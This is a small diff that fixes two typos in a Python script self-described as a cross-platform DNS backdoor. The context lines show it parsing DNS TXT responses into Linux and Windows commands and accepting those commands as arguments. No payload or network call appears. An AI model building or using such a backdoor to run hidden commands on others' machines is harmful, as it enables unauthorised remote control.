@@ -47,7 +47,7 @@ def parse_txt(txt_response):
                 linux_cmd = unencrypted[0][2:]
                 windows_cmd = unencrypted[1]
                 print("-"*25)
-                print("Os\t\tCommand")
+                print("OS\t\tCommand")
                 print("-"*25)
                 if linux_cmd:
                     print("Linux\t\t'{}'".format(linux_cmd))
@@ -77,7 +77,7 @@ def h_encode(txt):
 
 if __name__ == "__main__":
     print(banner)
-    parser = argparse.ArgumentParser(description='ddor, crossplatform dns backdoor')
+    parser = argparse.ArgumentParser(description='ddoor, crossplatform dns backdoor')
     #group = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('-l', action="store", dest="linux_cmd", help="Linux Command", default="")
     parser.add_argument('-w', action="store", dest="windows_cmd", help="Windows Command", default="")
